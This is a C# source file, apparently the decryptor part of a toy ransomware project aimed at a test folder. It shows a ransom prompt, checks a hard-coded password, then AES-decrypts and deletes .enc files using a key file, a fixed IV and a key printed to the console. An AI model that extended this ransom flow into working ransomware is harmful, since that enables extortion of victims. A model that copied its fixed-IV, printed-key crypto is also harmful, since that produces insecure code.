using System;
using System.Security.Cryptography;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Security.AccessControl;


namespace Decryptor
{
    internal class DecryptorClass
    {
        static List<string> targetExtensions = new List<string>() { ".txt", ".jpg", ".png", ".pdf", ".mp4" };
        //String key;
        static List<string> foldersBlacklist = new List<string>() { "Windows", "Program Files", "Program Files (x86)", ".pdf", ".mp4" };

        public static void Main(string[] args)
        {
            // Decide on base directory
            string baseDirectory = "c:/test";

            // getting paied
            System.Console.WriteLine("Your feils have been encryptrd! to decrypt them enter the password:");
            string password = System.Console.ReadLine();
            while (password != "password")
            {
                System.Console.WriteLine("Wrong password!");
                password = System.Console.ReadLine();
            }

            // Decrypting the victims files after getting paied 
            AesCryptoServiceProvider decryptAes = getDecryptionCipher();
            itterate(baseDirectory, decryptAes, "decrypt");
            System.Console.WriteLine("Your feils have been decrypted :)");
        }

        public static void itterate(string currentDirectory, AesCryptoServiceProvider aes, string mod)
        {

            var currentFiles = Directory.GetFiles(currentDirectory, "*.enc");

            foreach (string filePath in currentFiles)
            {
                decryptFile(filePath, aes);
            }
            var currentDirectories = Directory.GetDirectories(currentDirectory);
            foreach (string directory in currentDirectories)
            {
                itterate(directory, aes, mod);
            }

        }

        public static void decryptFile(string filePath, AesCryptoServiceProvider aes)
        {
            //create new file name
            string origname = filePath.Remove(filePath.Length - 4);
            var buffer = new byte[65536];
            using (var streamIn = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            using (var streamOut = new FileStream(origname, FileMode.Create))
            using (var decrypt = new CryptoStream(streamOut, aes.CreateDecryptor(), CryptoStreamMode.Write))
            {
                int bytesRead;
                do
                {
                    bytesRead = streamIn.Read(buffer, 0, buffer.Length);
                    if (bytesRead != 0)
                        decrypt.Write(buffer, 0, bytesRead);
                }
                while (bytesRead != 0);
            }
            File.Delete(filePath);

        }

        public static AesCryptoServiceProvider getDecryptionCipher()
        {
            var aes = new AesCryptoServiceProvider();

            using (var streamIn = new FileStream("c:/test/keyFile.key", FileMode.Open, FileAccess.Read))
            {
                BinaryReader bin = new BinaryReader(streamIn, new System.Text.UTF8Encoding());
                aes.Key = bin.ReadBytes(32);
                Console.WriteLine(BitConverter.ToString(aes.Key));
                aes.IV = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
                bin.Close();
            }

            return aes;

        }
    }
}